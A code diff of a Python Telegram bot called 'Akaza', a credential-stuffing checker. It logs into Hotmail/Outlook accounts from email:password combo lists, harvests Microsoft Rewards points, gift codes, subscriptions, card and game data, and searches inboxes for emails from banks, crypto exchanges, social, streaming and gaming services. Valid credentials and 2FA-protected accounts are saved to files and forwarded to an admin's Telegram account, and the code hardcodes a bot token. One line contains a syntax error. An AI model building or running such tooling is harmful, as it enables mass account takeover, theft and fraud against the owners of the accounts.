@@ -23,7 +23,7 @@ logger = logging.getLogger(__name__)
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak')
 ADMIN_ID = int(os.environ.get('ADMIN_ID', '5944410248'))
 DB = os.environ.get('DB_PATH', 'checker.db')
-MAX_EXECUTOR_WORKERS = 500
+MAX_EXECUTOR_WORKERS = 200
 
 # flux.py login URL — DO NOT CHANGE
 SFTAG_URL = (
@@ -201,36 +201,54 @@ class AkazaDatabase:
 akaza_db = AkazaDatabase(DB)
 
 # ============================================================================
-# SECTION 5 — TARGET DOMAINS & COMPANIES
+# SECTION 5 — SERVICE_KEYWORDS DICT
 # ============================================================================
-TARGET_DOMAINS = {
-    # Gaming Companies
-    "no-reply@roblox.com": "Roblox",
-    "roblox.com": "Roblox",
-    "steampowered.com": "Steam",
-    "noreply@steampowered.com": "Steam",
-    "epicgames.com": "Epic Games",
-    "riotgames.com": "Riot Games",
-    "ubisoft.com": "Ubisoft",
-    "ea.com": "EA",
-    "blizzard.com": "Blizzard",
-    "supercell.com": "Supercell",
-    "sony@txn-email.playstation.com": "PlayStation",
-    "playstation.com": "PlayStation",
-    "minecraft.net": "Minecraft",
+SERVICE_KEYWORDS = {
+    # Social
+    "instagram.com": "Instagram", "mail.instagram.com": "Instagram",
+    "facebook.com": "Facebook", "facebookmail.com": "Facebook",
+    "twitter.com": "Twitter", "x.com": "Twitter", "tiktok.com": "TikTok",
+    "snapchat.com": "Snapchat", "discord.com": "Discord", "discordapp.com": "Discord",
+    "telegram.org": "Telegram", "reddit.com": "Reddit", "linkedin.com": "LinkedIn",
+    "twitch.tv": "Twitch", "mail.twitch.tv": "Twitch",
+    "onlyfans.com": "OnlyFans", "patreon.com": "Patreon", "vk.com": "VK",
+    "whatsapp.com": "WhatsApp", "youtube.com": "YouTube",
     # Streaming
-    "netflix.com": "Netflix",
-    "spotify.com": "Spotify",
-    "disneyplus.com": "Disney+",
-    "hulu.com": "Hulu",
-    "hbo.com": "HBO",
-    "amazon.com": "Amazon",
-    "primevideo.com": "Prime Video",
-    "apple.com": "Apple",
-    # Specific domains
-    "account.tiktok.com": "TikTok",
-    "instagram.com": "Instagram",
-    "facebookmail.com": "Facebook",
+    "netflix.com": "Netflix", "spotify.com": "Spotify",
+    "disneyplus.com": "Disney+", "hulu.com": "Hulu", "hbo.com": "HBO",
+    "amazon.com": "Amazon", "primevideo.com": "Prime Video", 
+    "apple.com": "Apple", "appleid.apple.com": "Apple",
+    "peacocktv.com": "Peacock", "paramountplus.com": "Paramount+", "tidal.com": "Tidal",
+    "deezer.com": "Deezer",
+    # Gaming
+    "xbox.com": "Xbox", "playstation.com": "PlayStation", "nintendo.com": "Nintendo",
+    "steampowered.com": "Steam", "epicgames.com": "Epic Games", "riotgames.com": "Riot Games",
+    "minecraft.net": "Minecraft", "roblox.com": "Roblox", "ubisoft.com": "Ubisoft",
+    "ea.com": "EA", "blizzard.com": "Blizzard", "valorant.com": "Valorant",
+    "fortnite.com": "Fortnite", "pubg.com": "PUBG", "callofduty.com": "COD",
+    "rockstargames.com": "Rockstar",
+    # Finance
+    "paypal.com": "PayPal", "venmo.com": "Venmo", "cash.app": "CashApp",
+    "stripe.com": "Stripe", "revolut.com": "Revolut", "wise.com": "Wise",
+    "coinbase.com": "Coinbase", "binance.com": "Binance", "kraken.com": "Kraken",
+    "robinhood.com": "Robinhood",
+    # Shopping
+    "ebay.com": "eBay", "aliexpress.com": "AliExpress", "etsy.com": "Etsy",
+    "walmart.com": "Walmart", "target.com": "Target", "shopify.com": "Shopify",
+    "nike.com": "Nike", "adidas.com": "Adidas",
+    # Food & Travel
+    "ubereats.com": "UberEats", "doordash.com": "DoorDash", "grubhub.com": "GrubHub",
+    "deliveroo.co.uk": "Deliveroo", "uber.com": "Uber", "lyft.com": "Lyft",
+    "airbnb.com": "Airbnb", "booking.com": "Booking.com", "expedia.com": "Expedia",
+    # Cloud & VPN & Mail
+    "dropbox.com": "Dropbox", "google.com": "Google", "accounts.google.com": "Google", "mail.google.com": "Google",
+    "onedrive.com": "OneDrive", "icloud.com": "iCloud", "yahoo.com": "Yahoo", "mail.yahoo.com": "Yahoo",
+    "nordvpn.com": "NordVPN", "expressvpn.com": "ExpressVPN",
+    "surfshark.com": "Surfshark", "protonvpn.com": "ProtonVPN", "mail.proton.me": "Proton",
+    # Education & Productivity
+    "coursera.org": "Coursera", "udemy.com": "Udemy", "duolingo.com": "Duolingo",
+    "grammarly.com": "Grammarly", "office365.com": "Office 365", "zoom.us": "Zoom",
+    "slack.com": "Slack", "adobe.com": "Adobe", "canva.com": "Canva"
 }
 
 # ============================================================================
@@ -423,42 +441,47 @@ class AkazaChecker:
             logger.debug(f"Outlook login error {email}: {e}")
             return None, None
 
-    # ── REWARDS POINTS (Optimized: Method 1, 2, 3) ──────────────────────────
+    # ── REWARDS POINTS ─────────────────────────────────────────────────────
     def get_rewards_points(self):
-        """Optimized points fetching from p7.py"""
+        # 1. Primary API: getuserinfo
         try:
-            headers = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-                "Accept": "application/json, text/plain, */*",
-                "Referer": "https://rewards.bing.com/"
-            }
-            # Method 1: Primary Bing API
-            try:
-                r = self.session.get("https://rewards.bing.com/api/getuserinfo", headers=headers, timeout=8, verify=False)
-                if r.status_code == 200:
-                    data = r.json()
-                    pts = data.get('availablePoints') or data.get('dashboard', {}).get('userStatus', {}).get('availablePoints')
-                    if pts is not None: return int(pts)
-            except: pass
+            r = self.session.get("https://rewards.bing.com/api/getuserinfo", timeout=10, verify=False)
+            if r.status_code == 200:
+                data = r.json()
+                if 'availablePoints' in data:
+                    return int(data['availablePoints'])
+                if 'dashboard' in data and 'userStatus' in data['dashboard'] and 'availablePoints' in data['dashboard']['userStatus']:
+                    return int(data['dashboard']['userStatus']['availablePoints'])
+        except Exception as e:
+            logger.debug(f"Rewards API (getuserinfo) failed: {e}")
 
-            # Method 2: Flyout API
-            try:
-                r = self.session.get("https://www.bing.com/rewardsapp/flyoutHub?format=json", headers=headers, timeout=8, verify=False)
-                if r.status_code == 200:
-                    data = r.json()
-                    if 'userInfo' in data and 'balance' in data['userInfo']: return int(data['userInfo']['balance'])
-            except: pass
+        # 2. Secondary API: flyoutHub
+        try:
+            r = self.session.get("https://www.bing.com/rewardsapp/flyoutHub?format=json", timeout=10, verify=False)
+            if r.status_code == 200:
+                data = r.json()
+                if 'userInfo' in data and 'balance' in data['userInfo']:
+                    return int(data['userInfo']['balance'])
+        except Exception as e:
+            logger.debug(f"Rewards API (flyoutHub) failed: {e}")
 
-            # Method 3: Page scraping
-            try:
-                r = self.session.get("https://rewards.bing.com", headers=headers, timeout=10, verify=False)
-                if r.status_code == 200:
-                    match = re.search(r'"availablePoints"\s*:\s*(\d+)', r.text)
-                    if match:
-                        points = int(match.group(1))
-                        if 0 <= points <= 500000: return points
-            except: pass
-        except: pass
+        # 3. Fallback: Scrape rewards page
+        try:
+            r = self.handle_fmhf(self.session.get("https://rewards.bing.com", timeout=12, verify=False))
+            match = re.search(r'"availablePoints"\s*:\s*(\d+)', r.text)
+            if match:
+                points = int(match.group(1))
+                if 0 <= points <= 999999: # Basic sanity check
+                    return points
+            
+            # Another scraping pattern
+            match = re.search(r'id="id_rc"\s*>\s*([,\d]+)', r.text)
+            if match:
+                return int(match.group(1).replace(',', ''))
+
+        except Exception as e:
+            logger.debug(f"Rewards page scraping failed: {e}")
+
         return 0
 
     # ── REDEMPTION CODES (flux.py full logic) ──────────────────────────────
@@ -744,15 +767,13 @@ class AkazaChecker:
         except: pass
         return None
 
-    # ── INBOX SCAN (Optimized: hit.py logic) ──────────────────────────────
-    def scan_inbox_enhanced(self, tk, cid, u_kws=None):
-        """Enhanced inbox scanning using hit.py logic and target domains"""
+    # ── INBOX SCAN (hit.py enhanced + SERVICE_KEYWORDS) ───────────────────
+    def scan_inbox_enhanced(self, tk, cid, uk):
         res = {"total": 0, "hits": {}}
         if not tk or not cid: return res
         h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}',
              'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json'}
-        
-        # 1. Total Count
+        # Get inbox total count
         try:
             r_start = self.session.post(
                 f"https://outlook.live.com/owa/{quote(cid)}/startupdata.ashx?app=Mini&n=0",
@@ -762,30 +783,24 @@ class AkazaChecker:
             if m_count: res['total'] = int(m_count.group(1))
         except: pass
 
-        # 2. Sequential search for better reliability
-        combined = list(dict.fromkeys(list(TARGET_DOMAINS.keys()) + (u_kws or [])))
-        # Search in batches to avoid query limits
+        # Keyword batch search
+        combined = list(dict.fromkeys(list(SERVICE_KEYWORDS.keys()) + (uk or [])))
         for i in range(0, len(combined), 10):
             batch = combined[i:i+10]
             q = ' OR '.join([f'"{k}"' for k in batch])
-            payload = {
-                "Cvid": str(uuid.uuid4()),
-                "Scenario": {"Name": "owa.react"},
-                "EntityRequests": [{
-                    "EntityType": "Conversation", "ContentSources": ["Exchange"],
-                    "Query": {"QueryString": q}, "Size": 50
-                }]
-            }
+            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
+                 "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"],
+                                     "Query": {"QueryString": q}, "Size": 25}]}
             try:
                 r = self.session.post("https://outlook.live.com/search/api/v2/query",
-                                      json=payload, headers=h, timeout=12, verify=False).json()
-                rset = r.get('EntitySets', [{}])[0].get('ResultSets', [{}])[0]
+                                      json=p, headers=h, timeout=12, verify=False).json()
+                rset = r['EntitySets'][0]['ResultSets'][0]
                 if rset.get('Total', 0) > 0:
-                    for item in rset.get('Results', []):
-                        preview = (item.get('Subject', '') + ' ' + item.get('Preview', '')).lower()
+                    for hit in rset.get('Results', []):
+                        text = (hit.get('Subject', '') + ' ' + hit.get('Preview', '')).lower()
                         for k in batch:
-                            if k.lower() in preview:
-                                name = TARGET_DOMAINS.get(k, k)
+                            if k.lower() in text:
+                                name = SERVICE_KEYWORDS.get(k, k)
                                 res['hits'][name] = res['hits'].get(name, 0) + 1
             except: pass
         return res
@@ -1014,69 +1029,88 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
                     for su in active:
                         s_str = su['name']
                         if 'days_remaining' in su: s_str += f" ({su['days_remaining']}d"
-                    for co in codes:
-                        codes_results.append(f"{email}:{password} | {co.get('category','Unknown')}: {co['code']} {co.get('redemption_url','')}")
-                
-                # 4. Inbox specific file
+                        if 'auto_renew' in su: s_str += f", AR:{su['auto_renew']}"
+                        if 'days_remaining' in su: s_str += ")"
+                        sub_lines.append(s_str)
+                    msg += f"🎮 MS Subs: {', '.join(sub_lines)}\n"
+                if subs_data.get('balance'): msg += f"💳 Balance: {subs_data['balance']}\n"
+                if subs_data.get('card'): msg += f"💳 Card: {subs_data['card']}\n"
+
+                # Minecraft with capes
+                mc = data.get('mc', {})
+                if mc.get('owned'):
+                    mc_str = f"⛏️ Minecraft: `{mc.get('username','?')}`"
+                    if mc.get('uuid'): mc_str += f" | UUID: `{mc['uuid'][:8]}...`"
+                    if mc.get('capes'): mc_str += f" | Capes: {', '.join(mc['capes'])}"
+                    msg += mc_str + "\n"
+
+                # PSN
+                psn = data.get('psn', {})
+                if psn.get('count', 0) > 0:
+                    msg += f"🎮 PSN: {psn['count']} orders"
+                    if psn.get('items'): msg += f" — {', '.join(psn['items'][:3])}"
+                    msg += "\n"
+
+                # Steam
+                steam = data.get('steam', {})
+                if steam.get('count', 0) > 0:
+                    msg += f"🎮 Steam: {steam['count']} purchase emails\n"
+
+                # Supercell
+                if data.get('supercell'):
+                    msg += f"📱 Supercell: {', '.join(data['supercell'])}\n"
+
+                # TikTok
+                if data.get('tiktok'):
+                    msg += f"🎵 TikTok: `{data['tiktok']}`\n"
+
+                # Inbox (with total and top keywords)
                 inbox = data.get('inbox', {})
                 inbox_total = inbox.get('total', 0) if isinstance(inbox, dict) else 0
-                inbox_hits = inbox.get('hits', {}) if isinstance(inbox, dict) else {}
-                if inbox_total > 0 or inbox_hits:
-                    kw_str = ", ".join([f"{k}({v})" for k,v in inbox_hits.items()])
-                    inbox_results.append(f"{email}:{password} | Total: {inbox_total} | KWs: {kw_str}")
+                inbox_hits  = inbox.get('hits', inbox) if isinstance(inbox, dict) else {}
+                if inbox_total: msg += f"📬 Inbox: {inbox_total} total\n"
+                if inbox_hits:
+                    top5 = list(inbox_hits.items())[:5]
+                    sv = ', '.join(f"{k}({v})" for k, v in top5)
+                    msg += f"🔑 Keywords: {sv}\n"
+                    if len(inbox_hits) > 5: msg += f"  ...+{len(inbox_hits)-5} more\n"
 
-                last_h.append(email); last_h = last_h[-5:]
-            elif st == '2fa': 
-                tfa += 1
-            elif st == 'error': 
-                err += 1
-            else: 
-                bad += 1
+                try: await c.bot.send_message(uid, msg, parse_mode='Markdown', disable_web_page_preview=True)
+                except: pass
+                if uid != ADMIN_ID:
+                    try: await c.bot.send_message(ADMIN_ID, f"📢 User {uid} hit:\n{msg}", parse_mode='Markdown', disable_web_page_preview=True)
+                    except: pass
 
+                psn_c = psn.get('count', 0); steam_c = steam.get('count', 0)
+                with open(h_f, 'a') as f:
+                    f.write(f"{data['email']}:{data['password']} | Pts:{pts} | Country:{country} | Codes:{len(codes)} | Subs:{len(active)} | MC:{'YES' if mc.get('owned') else 'NO'} | PSN:{psn_c} | Steam:{steam_c}\n")
+
+                last_h.append(data['email']); last_h = last_h[-5:]
+            elif st == '2fa': tfa += 1; open(tfa_f, 'a').write(f"{data.get('email','')}:{data.get('password','')}\n")
+            elif st == 'error': err += 1
+            else: bad += 1
             async with up_lock:
                 if time.time() - last_up > 3 or checked == len(lines):
                     last_up = time.time(); el = time.time() - start_t; cpm = int((checked/el)*60) if el > 0 else 0
-                    prg = (f"� <b>Checking Session</b> 💠\n\n"
-                           f"📊 <b>Progress:</b> <code>{checked}/{len(lines)}</code>\n"
-                           f"⚡ <b>CPM:</b> <code>{cpm}</code>\n"
-                           f"🎯 <b>Hits:</b> <code>{hits}</code>\n"
-                           f"💀 <b>Bad:</b> <code>{bad}</code>\n"
-                           f"🔒 <b>2FA:</b> <code>{tfa}</code>\n"
-                           f"❌ <b>Errors:</b> <code>{err}</code>\n\n"
-                           f"🕒 <b>Recent:</b> <code>{' | '.join(last_h) or 'None'}</code>")
+                    prg = f"🔄 **Live Check**\n\n📊 `{checked}/{len(lines)}` | ⚡ CPM: `{cpm}`\n🎯 Hits: `{hits}` | 💀 Bad: `{bad}`\n🔒 2FA: `{tfa}` | ❌ Errors: `{err}`\n\n🕒 Last Hits:\n`{'|'.join(last_h) or 'None'}`"
                     try: await status_msg.edit_text(prg, parse_mode='HTML')
                     except: pass
 
-    tasks = [asyncio.create_task(worker(l)) for l in lines]
-    await asyncio.gather(*tasks)
+    tasks = []
+    for l in lines:
+        if akaza_db.is_banned(uid): break
+        tasks.append(asyncio.create_task(worker(l)))
+        await asyncio.sleep(0.1)
+    if tasks: await asyncio.gather(*tasks)
 
-    # FINAL REPORTING (FILES TO ADMIN)
-    user_handle = f"@{u.effective_user.username}" if u.effective_user.username else u.effective_user.first_name
-    admin_summary = f"📢 <b>Session Complete</b>\nUser: {user_handle} ({uid})\nTotal: {len(lines)}\nHits: {hits}"
-    
-    # Save results to temporary files and send
-    files_to_send = [
-        ("hits.txt", all_hits_results),
-        ("points.txt", points_results),
-        ("codes.txt", codes_results),
-        ("inbox.txt", inbox_results)
-    ]
-    
-    for filename, content_list in files_to_send:
-        if content_list:
-            path = f"{uid}_{filename}"
-            with open(path, 'w', encoding='utf-8') as f:
-                f.write(f"Generated by Akaza Bot for {user_handle}\n")
-                f.write("\n".join(content_list))
-            
-            with open(path, 'rb') as f:
-                await c.bot.send_document(ADMIN_ID, f, filename=filename, caption=f"📄 {filename} from {user_handle}")
-                # Also send to user for their own records
-                f.seek(0)
-                await c.bot.send_document(uid, f, filename=filename, caption=f"✅ Your {filename} is ready.")
-            os.remove(path)
-
-    await status_msg.edit_text(f"✅ <b>Check Complete!</b>\n\nTotal: <code>{len(lines)}</code>\nHits: <code>{hits}</code>\n\n<i>Results have been sent to you and the Admin.</i>", parse_mode="HTML")
+    for f_p, disp in [(h_f, "Hotmails Hits @darkcloudgateway.txt"), (tfa_f, "2fa.txt")]:
+        if os.path.exists(f_p):
+            with open(f_p, 'r') as f: content = f.read()
+            with open(f_p, 'w') as f: f.write(f"@larpsupport\n\n{content}\n@larpsupport")
+            with open(f_p, 'rb') as f:
+                if u.callback_query: await u.callback_query.message.reply_document(f, filename=disp, caption=f"✅ {disp}")
+                else: await u.message.reply_document(f, filename=disp, caption=f"✅ {disp}")
+            os.remove(f_p)
     if uid in user_proxies: del user_proxies[uid]
 
 async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
@@ -1091,7 +1125,7 @@ async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
         akaza_db.update_settings(uid, is_adding_kw=True)
         await q.edit_message_text("🔍 <b>Keyword Mode</b>\nSend keywords separated by spaces.\n/skw to stop.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
     elif q.data == "proxy":
-        await q.edit_message_text(f"🌐 <b>Proxy</b>\nLoaded: <code>{len(user_proxies.get(uid, []))}</code>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
+        await q.edit_message_text(f"🌐 <b>Proxy</b>\nLoaded: <code>{len(user_proxies.get(uid, []))}</code>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back",.callback_data="back")]]), parse_mode="HTML")
     elif q.data == "back": await start(u, c)
     elif q.data == "set_combo": await handle_combo(u, c)
     elif q.data == "set_proxy":
